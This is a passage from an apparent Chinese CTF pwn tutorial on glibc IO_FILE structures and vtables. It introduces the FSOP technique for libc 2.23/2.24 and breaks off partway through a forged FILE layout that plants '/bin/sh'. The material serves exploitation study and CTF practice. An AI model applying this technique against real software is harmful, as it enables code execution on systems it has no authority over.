</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="n">do_lock</span><span class="o">=</span><span class="n">do_lock</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">_IO_cleanup</span> <span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nf">__run_exit_handlers</span> <span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="mh">0x0</span><span class="p">,</span> <span class="n">listp</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">run_list_atexit</span><span class="o">=</span><span class="n">run_list_atexit</span><span class="err">@</span><span class="n">entry</span><span class="o">=</span><span class="mh">0x1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">__GI_exit</span> <span class="p">(</span><span class="n">status</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">__libc_start_main</span> <span class="p">(</span><span class="n">main</span><span class="o">=</span><span class="mh">0x400526</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">argc</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">argv</span><span class="o">=</span><span class="mh">0x7fffffffe578</span><span class="p">,</span> <span class="n">init</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">fini</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">rtld_fini</span><span class="o">=&lt;</span><span class="n">optimized</span> <span class="n">out</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">stack_end</span><span class="o">=</span><span class="mh">0x7fffffffe568</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">_start</span> <span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h1 id="io_file相关结构体">🔗<code>IO_FILE</code>相关结构体
</h1><p><code>_IO_FILE_plus</code>结构体的定义为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>vtable</code>对应的结构体<code>_IO_jump_t</code>的定义为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_jump_t</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* showmany */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#if 0</span><span class="c">
</span></span></span><span class="line"><span class="cl"><span class="c">    get_column;
</span></span></span><span class="line"><span class="cl"><span class="c">    set_column;
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个函数表中有<code>19</code>个函数，分别完成<code>IO</code>相关的功能，由<code>IO</code>函数调用，如<code>fwrite</code>最终会调用<code>__write</code>函数，<code>fread</code>会调用<code>__doallocate</code>来分配<code>IO</code>缓冲区等。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="cp">#define _IO_file_flags _flags
</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>   <span class="cm">/* Current read pointer */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>   <span class="cm">/* End of get area. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>  <span class="cm">/* Start of putback+get area. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span> <span class="cm">/* Start of put area. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>  <span class="cm">/* Current put pointer. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>  <span class="cm">/* End of put area. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>   <span class="cm">/* Start of reserve area. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>    <span class="cm">/* End of reserve area. */</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/* The following fields are used to support backing up and undo. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#if 0</span><span class="c">
</span></span></span><span class="line"><span class="cl"><span class="c">    int _blksize;
</span></span></span><span class="line"><span class="cl"><span class="c"></span><span class="cp">#else
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="cp">#define __HAVE_COLUMN
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>进程中<code>FILE</code>结构通过<code>_chain</code>域构成一个链表，链表头部为<code>_IO_list_all</code>全局变量，默认情况下依次链接了<code>stderr</code>,<code>stdout</code>,<code>stdin</code>三个文件流，并将新建的流插入到头部，<code>vtable</code>虚表为<code>_IO_file_jumps</code>。
此外，还有<code>_IO_wide_data</code>结构体：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_wide_data</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">      <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">      <span class="p">[...]</span>
</span></span><span class="line"><span class="cl">      <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">_wide_vtable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>还有一些宏的定义：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#define _IO_MAGIC 0xFBAD0000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _OLD_STDIO_MAGIC 0xFABC0000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_MAGIC_MASK 0xFFFF0000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_USER_BUF 1
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_UNBUFFERED 2
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_NO_READS 4
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_NO_WRITES 8
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_EOF_SEEN 0x10
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_ERR_SEEN 0x20
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_DELETE_DONT_CLOSE 0x40
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_LINKED 0x80
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_IN_BACKUP 0x100
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_LINE_BUF 0x200
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_TIED_PUT_GET 0x400
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_CURRENTLY_PUTTING 0x800
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_IS_APPENDING 0x1000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_IS_FILEBUF 0x2000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_BAD_SEEN 0x4000
</span></span></span><span class="line"><span class="cl"><span class="cp">#define _IO_USER_LOCK 0x8000
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>此外，许多<code>Pwn</code>题初始化的时候都会有下面三行：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nf">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>这是初始化程序的<code>io</code>结构体，只有初始化之后，<code>io</code>函数才能在程序过程中打印数据，如果不初始化，就只能在<code>exit</code>结束的时候，才能一起把数据打印出来。</p>
<h2 id="猜想">猜想
</h2><p>从上面可以看出，很多函数并没有用，但为什么还要设置这些呢？以下是我的猜想。</p>
<blockquote>
<ol>
<li><code>glibc</code>的文件操作经历了很多版本迭代，为了兼容之前的版本，保留了很多没有用的操作。</li>
<li>跳表种类很多，我们目前看到的是<code>file</code>操作，还有字符操作（str）、宽字符（wdate）操作、帮助文档操作（help）等等，有一些操作是独有的，类似于<code>_IO_new_file_xsputn</code>。有一些是通用的操作，类似于<code>_IO_default_uflow</code>。</li>
<li>先将框架搭起来，如果以后有需要的时候可以方便进行扩展。</li>
</ol>
</blockquote>
<p>对这些清楚了之后，我们就可以看看其他的<code>house</code>到底是干什么的了。</p>
<h2 id="io_file-attack-之-fsop-libc-223--224">IO_FILE attack 之 FSOP (libc 2.23 &amp; 2.24)
</h2><p>主要原理为劫持<code>vtable</code>与<code>_chain</code>，伪造<code>IO_FILE</code>，主要利用方式为调用<code>IO_flush_all_lockp()</code>函数触发。
<code>IO_flush_all_lockp()</code>函数将在以下三种情况下被调用：</p>
<ol>
<li><code>libc</code>检测到<strong>内存错误</strong>，从而执行<code>abort</code>函数时（在<code>glibc-2.26</code>删除）。</li>
<li>程序执行<code>exit</code>函数时。</li>
<li>程序从<code>main</code>函数返回时。</li>
</ol>
<p>源码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">_IO_flush_all_lockp</span> <span class="p">(</span><span class="kt">int</span> <span class="n">do_lock</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">last_stamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">  <span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">_IO_FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">_IO_list_all</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="n">fp</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="p">...</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="cp">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>       <span class="o">||</span> <span class="p">(</span><span class="nf">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">           <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
</span></span><span class="line"><span class="cl">                    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>       <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="o">&amp;&amp;</span> <span class="nf">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>   <span class="c1">//如果输出缓冲区有数据，刷新输出缓冲区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">    <span class="n">fp</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_chain</span><span class="p">;</span> <span class="c1">//遍历链表
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">[...]</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到，当满足：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>就会调用<code>_IO_OVERFLOW()</code>函数，而这里的<code>_IO_OVERFLOW</code>就是<strong>文件流对象虚表的第四项</strong>指向的内容<code>_IO_new_file_overflow</code>，因此在<code>libc-2.23</code>版本下可如下构造，进行<code>FSOP</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">.</span><span class="n">_chain</span> <span class="o">=&gt;</span> <span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">chunk_addr</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">file</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">_flags</span> <span class="o">=</span> <span class="s">&#34;/bin/sh</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="c1">//对应此结构体首地址(fp)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_end</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_read_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_base</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">...</span>
